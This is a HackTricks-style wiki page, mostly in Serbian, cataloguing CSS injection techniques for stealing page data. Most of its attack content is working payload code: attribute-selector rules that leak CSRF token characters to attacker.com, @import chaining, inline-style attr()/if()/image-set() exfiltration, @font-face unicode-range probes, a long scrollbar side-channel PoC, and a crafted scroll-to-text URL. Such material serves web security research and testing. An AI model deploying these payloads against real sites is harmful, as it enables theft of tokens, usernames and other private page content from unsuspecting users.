# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### Attribute Selector

CSS selektori su napisani da odgovaraju vrednostima atributa `name` i `value` elementa `input`. Ako atribut `value` elementa `input` počinje određenim karakterom, učitava se unapred definisan eksterni resurs:
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
Međutim, ovaj pristup ima ograničenje kada se radi o skrivenim input elementima (`type="hidden"`) jer skriveni elementi ne učitavaju pozadine.

#### Zaobilaženje za skrivenim elementima

Da biste zaobišli ovo ograničenje, možete ciljati naredni sibling element koristeći `~` general sibling combinator. CSS pravilo se potom primenjuje na sve elemente koji slede nakon skrivenog input elementa, što dovodi do učitavanja pozadinske slike:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
A practical example of exploiting this technique is detailed in the provided code snippet. You can view it [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Preduslovi za CSS Injection

Da bi CSS Injection bio efikasan, moraju biti ispunjeni sledeći uslovi:

1. **Payload Length**: CSS injection vector mora podržavati dovoljno duge payloads da primi kreirane selectors.
2. **CSS Re-evaluation**: Trebalo bi da imate mogućnost da frame the page, što je neophodno da bi se pokrenulo ponovno evaluiranje CSS-a sa novo generisanim payloads.
3. **External Resources**: Tehnika pretpostavlja mogućnost korišćenja eksterno hostovanih slika. Ovo može biti ograničeno Content Security Policy (CSP) sajta.

### Blind Attribute Selector

As [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration), it's possible to combine the selectors **`:has`** and **`:not`** to identify content even from blind elements. This is very useful when you have no idea what is inside the web page loading the CSS injection.\
It's also possible to use those selectors to extract information from several block of the same type like in:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Kombinovanjem ovoga sa sledećom tehnikom **@import**, moguće je eksfiltrirati veliki broj **informacija koristeći CSS injection sa slepih stranica uz** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Prethodna tehnika ima određene nedostatke — proverite preuslove. Potrebno je ili da možete **poslati više linkova žrtvi**, ili da možete **ubaciti kao iframe stranicu ranjivu na CSS injection**.

Međutim, postoji još jedna pametna tehnika koja koristi **CSS `@import`** da poboljša efikasnost tehnike.

Ovo je prvi prikazao [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) i funkcioniše ovako:

Umesto da istu stranicu učitavamo iznova sa desetinama različitih payload-a svaki put (kao u prethodnoj metodi), učitaćemo stranicu samo jednom i to sa importom ka napadačevom serveru (ovo je payload koji se šalje žrtvi):
```css
@import url("//attacker.com:5001/start?");
```
1. Import će **primiti neki CSS script** od napadača i **pregledač će ga učitati**.
2. Prvi deo CSS scripta koji napadač pošalje je **još jedan `@import` na server napadača.**
1. Server napadača još neće odgovoriti na taj zahtev, jer želimo da leak-ujemo nekoliko karaktera, a zatim odgovorimo na taj import sa payload-om da leak-ujemo sledeće.
3. Drugi i veći deo payload-a biće **attribute selector leakage payload**
1. Ovo će poslati serveru napadača **prvi karakter tajne i poslednji**
4. Kada server napadača primi **prvi i poslednji karakter tajne**, on će **odgovoriti na import zahtevan u koraku 2**.
1. Odgovor će biti tačno isti kao **koraci 2, 3 i 4**, ali ovaj put će pokušati da **pronađe drugi karakter tajne i zatim pretposlednji**.

Napadač će pratiti tu petlju dok ne uspe potpuno da leak-uje tajnu.

You can find the original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the [**same code but commented here**.](#css-injection)

> [!TIP]
> Skripta će pokušavati da otkrije po 2 karaktera svaki put (od početka i od kraja) zato što attribute selector dozvoljava da se uradi nešto kao:
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> Ovo omogućava skripti da brže leak-uje tajnu.

> [!WARNING]
> Ponekad skripta **ne detektuje ispravno da su prefiks + sufiks koji su otkriveni već kompletan flag** i nastaviće da ide napred (u prefiksu) i nazad (u sufiksu) i u nekom trenutku će zastati.\
> Bez brige, samo proverite **output** jer **možete videti flag tamo**.

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

Ova primitive omogućava exfiltration koristeći samo inline style atribut elementa, bez selektora ili eksternih stylesheet-a. Oslanja se na CSS custom properties, funkciju attr() za čitanje atributa istog elementa, nove CSS if() uslove za grananje, i image-set() za pokretanje network zahteva koji enkodira poklapanu vrednost.

> [!WARNING]
> Equality comparisons in if() require double quotes for string literals. Single quotes will not match.

- Sink: kontrolišite style atribut elementa i osigurajte da je target atribut na istom elementu (attr() reads only same-element attributes).
- Read: kopirajte atribut u CSS varijablu: `--val: attr(title)`.
- Decide: izaberite URL koristeći ugnježdene conditionals koji porede varijablu sa string kandidatima: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: primenite `background: image-set(var(--steal))` (ili bilo koje fetching svojstvo) da prisilite zahtev ka odabranom endpoint-u.

Attempt (does not work; single quotes in comparison):
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
Radni payload (dvostruki navodnici su obavezni u poređenju):
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
Enumerisanje vrednosti atributa sa ugnježdenim uslovima:
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
Realističan demo (probing usernames):
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
Notes and limitations:

- Radi na preglednicima zasnovanim na Chromiumu u vreme istraživanja; ponašanje se može razlikovati na drugim engine-ima.
- Najbolje pogodno za konačne/enumerabilne prostore vrednosti (IDs, flags, short usernames). Krađa proizvoljno dugih nizova bez eksternih stylesheet-ova ostaje izazovna.
- Bilo koja CSS property koja povlači URL može se koristiti za pokretanje zahteva (npr. background/image-set, border-image, list-style, cursor, content).

Automation: a Burp Custom Action can generate nested inline-style payloads to brute-force attribute values: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### Other selectors

Drugi načini za pristup delovima DOM-a pomoću **CSS selectors**:

- **`.class-to-search:nth-child(2)`**: Ovo će pretražiti drugi element sa klasom "class-to-search" u DOM-u.
- **`:empty`** selector: Koristi se na primer u [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### Error based XS-Search

**Reference:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Opšti cilj je da se **koristi custom font sa kontrolisanog endpoint-a** i da se osigura da se **tekst (u ovom slučaju, 'A') prikaže tim fontom samo ako navedeni resurs (`favicon.ico`) ne može da se učita**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Korišćenje prilagođenog fonta**:

- Prilagođeni font je definisan pomoću `@font-face` pravila unutar `<style>` taga u `<head>` sekciji.
- Font se zove `poc` i preuzet je sa eksternog endpointa (`http://attacker.com/?leak`).
- Svojstvo `unicode-range` je postavljeno na `U+0041`, ciljajući specifičan Unicode karakter 'A'.

2. **Object element sa rezervnim tekstom**:
- Kreiran je `<object>` element sa `id="poc0"` u `<body>` sekciji. Ovaj element pokušava da učita resurs sa `http://192.168.0.1/favicon.ico`.
- `font-family` za ovaj element je postavljen na `'poc'`, kao što je definisano u `<style>` sekciji.
- Ako resurs (`favicon.ico`) ne uspe da se učita, rezervni sadržaj (slovo 'A') unutar `<object>` taga će biti prikazan.
- Rezervni sadržaj ('A') biće renderovan koristeći prilagođeni font `poc` ako eksterni resurs ne može biti učitan.

### Stilizovanje Scroll-to-text fragmenta

The **`:target`** pseudo-class se koristi za izbor elementa koji je cilj **URL fragmenta**, kako je navedeno u [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). Važno je razumeti da `::target-text` ne odgovara nijednom elementu osim ako tekst nije eksplicitno ciljan fragmentom.

Pojavljuje se sigurnosni problem kada napadači iskorišćavaju **Scroll-to-text** fragment feature, što im omogućava da potvrde prisustvo određenog teksta na veb-stranici tako što učitaju resurs sa svog servera putem HTML injection. Metoda uključuje injektovanje CSS pravila kao ovo:
```css
:target::before {
content: url(target.png);
}
```
U takvim scenarijima, ako se na stranici nalazi tekst "Administrator", za resurs `target.png` se šalje zahtev serveru, što ukazuje na prisustvo tog teksta. Primer ovog napada može se izvesti putem posebno konstruisanog URL-a koji ugrađuje injektovani CSS zajedno sa Scroll-to-text fragmentom:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Ovde napad manipuliše HTML injection-om da prenese CSS kod, ciljajući na specifičan tekst "Administrator" preko Scroll-to-text fragment (`#:~:text=Administrator`). Ako je taj tekst pronađen, označeni resurs se učitava, nenamerno signalizirajući njegovu prisutnost napadaču.

Za mitigaciju treba napomenuti sledeće tačke:

1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF) je dizajniran da se poklapa samo sa rečima ili rečenicama, čime se ograničava njegova sposobnost da leak proizvoljnih tajni ili tokena.
2. **Restriction to Top-level Browsing Contexts**: STTF radi isključivo u top-level browsing contexts i ne funkcioniše unutar iframes, što svaki pokušaj eksploatacije čini uočljivijim korisniku.
3. **Necessity of User Activation**: STTF zahteva user-activation gesture da bi funkcionisao, što znači da su eksploatacije izvodljive samo preko navigacija iniciranih od strane korisnika. Ovaj zahtev značajno smanjuje rizik da napadi budu automatizovani bez interakcije korisnika. Ipak, autor blog posta ukazuje na specifične uslove i bypass-e (npr. social engineering, interakcija sa široko korišćenim browser extensions) koji mogu olakšati automatizaciju napada.

Svest o ovim mehanizmima i potencijalnim ranjivostima ključna je za održavanje web bezbednosti i zaštitu od ovakvih eksploatacionih taktika.

Za više informacija pogledajte originalni izveštaj: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

You can check an [**exploit using this technique for a CTF here**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Možete specificirati **eksterne fontove za određene unicode vrednosti** koji će biti **dohvaćeni samo ako te unicode vrednosti postoje** na stranici. Na primer:
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
Kada pristupite ovoj stranici, Chrome and Firefox preuzimaju "?A" i "?B" zato što text node od sensitive-information sadrži "A" i "B" karaktere. Ali Chrome and Firefox ne preuzimaju "?C" jer ne sadrži "C". To znači da smo uspeli da pročitajemo "A" i "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Referenca:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Tehnika opisana uključuje izvlačenje teksta iz noda iskorišćavanjem font ligatura i praćenjem promena u širini. Proces obuhvata nekoliko koraka:

1. **Kreiranje prilagođenih fontova**:

- SVG fontovi se prave sa glyphovima koji imaju atribut `horiz-adv-x`, koji postavlja veliku širinu za glyph koji predstavlja niz od dva karaktera.
- Primer SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, gde "XY" označava niz od dva karaktera.
- Ovi fontovi se zatim konvertuju u woff format koristeći fontforge.

2. **Detekcija promena širine**:

- CSS se koristi da se obezbedi da se tekst ne prelama (`white-space: nowrap`) i da bi se prilagodio stil scrollbar-a.
- Pojava horizontalnog scrollbar-a, stilizovanog na specifičan način, deluje kao indikator (oracle) da je određena ligatura, a samim tim i određeni niz karaktera, prisutan u tekstu.
- Uključeni CSS:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Proces exploita**:

- **Korak 1**: Fontovi se kreiraju za parove karaktera sa znatnom širinom.
- **Korak 2**: Koristi se trik zasnovan na scrollbar-u da se detektuje kada se renderuje glyph velike širine (ligatura za par karaktera), što ukazuje na prisustvo tog niza karaktera.
- **Korak 3**: Po detekciji ligature, generišu se novi glyphovi koji predstavljaju nizove od tri karaktera, uključujući detektovani par i dodajući prethodni ili naredni karakter.
- **Korak 4**: Sprovodi se detekcija ligature od tri karaktera.
- **Korak 5**: Proces se ponavlja, postupno otkrivajući ceo tekst.

4. **Optimizacija**:
- Trenutna metoda inicijalizacije koja koristi `<meta refresh=...` nije optimalna.
- Efikasniji pristup bi mogao uključivati CSS `@import` trik, poboljšavajući performanse exploita.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referenca:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Ovaj trik je objavljen u ovoj [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). Charset koji se koristi u text node može biti leaked **koristeći default fonts** instalirane u browseru: nisu potrebni eksterni -ili prilagođeni- fontovi.

Koncept se zasniva na korišćenju animacije koja postepeno širi širinu `div`-a, dopuštajući po jednom karakteru da pređe iz 'suffix' dela teksta u 'prefix' deo. Ovaj proces efektivno deli tekst na dve sekcije:

1. Prefix: početni red.
2. Suffix: naredni red(ovi).

Faze tranzicije karaktera bi izgledale ovako:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

Tokom ove tranzicije, koristi se **unicode-range trick** da se identifikuje svaki novi karakter kada se pridruži prefiksu. Ovo se postiže promenom fonta u Comic Sans, koji je znatno viši od default fonta, što posredno izaziva pojavu vertikalnog scrollbar-a. Pojava ovog scrollbar-a indirektno otkriva prisustvo novog karaktera u prefiksu.

Iako ova metoda omogućava detekciju jedinstvenih karaktera kako se pojavljuju, ona ne specificira koji karakter se ponavlja — samo da je došlo do ponavljanja.

> [!TIP]
> U suštini, **unicode-range is used to detect a char**, ali pošto ne želimo da učitavamo eksterni font, treba naći drugi način.\
> Kada je **char** **found**, njemu se dodeljuje pre-instalirani **Comic Sans font**, koji **čini** char **većim** i **pokreće scroll bar** koji će **leak the found char**.

Proverite kod izvučen iz PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo je pomenuto kao [neuspešno rešenje u ovom writeupu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Ovaj slučaj je veoma sličan prethodnom, međutim, ovde je cilj da određeni **znakovi budu veći od drugih kako bi se nešto sakrilo** — na primer dugme koje bot ne bi trebalo da pritisne ili slika koja se neće učitati. Tako možemo izmeriti akciju (ili izostanak akcije) i saznati da li se određeni znak nalazi u tekstu.

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo je pomenuto kao [neuspešno rešenje u ovom writeupu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

U ovom slučaju mogli bismo pokušati leak da bismo utvrdili da li se određeni znak nalazi u tekstu učitavanjem lažnog fonta iz same origin:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
If there is a match, the **font will be loaded from `/static/bootstrap.min.css?q=1`**. Although it won’t load successfully, the **browser should cache it**, and even if there is no cache, there is a **304 not modified** mechanism, so the **response should be faster** than other things.

However, if the time difference of the cached response from the non-cached one isn't big enough, this won't be useful. For example, the author mentioned: However, after testing, I found that the first problem is that the speed is not much different, and the second problem is that the bot uses the `disk-cache-size=1` flag, which is really thoughtful.

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** O ovome se pominje kao [neuspešno rešenje u ovom writeupu](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

In this case you can indicate **CSS to load hundreds of fake fonts** from the same origin when a match occurs. This way you can **measure the time** it takes and find out if a char appears or not with something like:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
A kod bota izgleda ovako:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Dakle, ako font ne odgovara, očekivano je da će vreme odgovora prilikom posećivanja bota biti otprilike 30 sekundi. Međutim, ako postoji poklapanje fonta, biće poslato više zahteva za preuzimanje fonta, što će izazvati kontinuiranu mrežnu aktivnost. Kao rezultat toga, biće potrebno više vremena da se zadovolji uslov za zaustavljanje i primi odgovor. Zato se vreme odgovora može koristiti kao indikator za utvrđivanje da li postoji poklapanje fonta.

## References

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
